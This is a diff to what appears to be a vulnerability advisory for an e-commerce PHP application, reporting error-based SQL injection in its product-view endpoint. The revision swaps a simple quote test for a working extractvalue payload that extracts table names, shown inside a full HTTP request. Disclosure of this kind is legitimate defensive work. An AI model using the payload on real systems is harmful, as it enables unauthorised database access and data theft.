@@ -8,10 +8,10 @@
 - **Status:** Unpatched  
 
 ## **Vulnerable Endpoint:**  
-- `/pizza/view_prod.php?id=3`
+- `/pizzafy/view_prod.php?id=3`
 
 ## **Overview**
-The Pizzafy Ecommerce System 1.0 contains multiple SQL Injection vulnerabilities that allow an attacker to extract sensitive data, bypass authentication, and get records from the database.
+The Pizzafy Ecommerce System 1.0 contains SQL Injection vulnerabilities that allow an attacker to extract sensitive data, bypass authentication, and get records from the database.
 
 ## **Vulnerability Description:**  
 # Error-Based SQL Injection Vulnerability in SELECT Operation
@@ -56,7 +56,7 @@ if (!$qry) {
 Below is a **GET** request demonstrating the vulnerability using a **Error-Based SQL injection payload**:  
 
 ```
-GET /pizza/view_prod.php?id=3' HTTP/1.1
+GET /pizzafy/view_prod.php?id=9%20AND%20extractvalue(1,%20concat(0x7e,%20(SELECT%20table_name%20FROM%20information_schema.tables%20WHERE%20table_schema=database()%20LIMIT%200,1)))%20-- HTTP/1.1
 Host: localhost
 sec-ch-ua: 
 Accept: */*
@@ -67,10 +67,10 @@ sec-ch-ua-platform: ""
 Sec-Fetch-Site: same-origin
 Sec-Fetch-Mode: cors
 Sec-Fetch-Dest: empty
-Referer: http://localhost/pizza/index.php?page=home
+Referer: http://localhost/pizzafy/index.php?page=home
 Accept-Encoding: gzip, deflate
 Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7
-Cookie: PHPSESSID=fvkkm43h4pnc6r6khno620js83
+Cookie: __SRMS__logged=2; __SRMS__key=206b8e5962b2c723e98fba4bbeec7eaaec379ecee8f8d585d60cb304bf6d87ec; PHPSESSID=cibugvssqjpg73n0grv4fbg9lf
 Connection: close
 ```
 
@@ -78,7 +78,7 @@ Connection: close
 This payload injects the SQL command:  
 
 ```sql
-id=1'
+9%20AND%20extractvalue(1,%20concat(0x7e,%20(SELECT%20table_name%20FROM%20information_schema.tables%20WHERE%20table_schema=database()%20LIMIT%200,1)))%20-- 
 ```
 This makes it possible to get data from the database.
 
@@ -86,7 +86,7 @@ This makes it possible to get data from the database.
 
 ## Image
 
-- ![](https://i.imgur.com/FrqEuza.png)
+- ![](https://i.imgur.com/f4BZDJR.png)
 ---
 
 ## Remediation
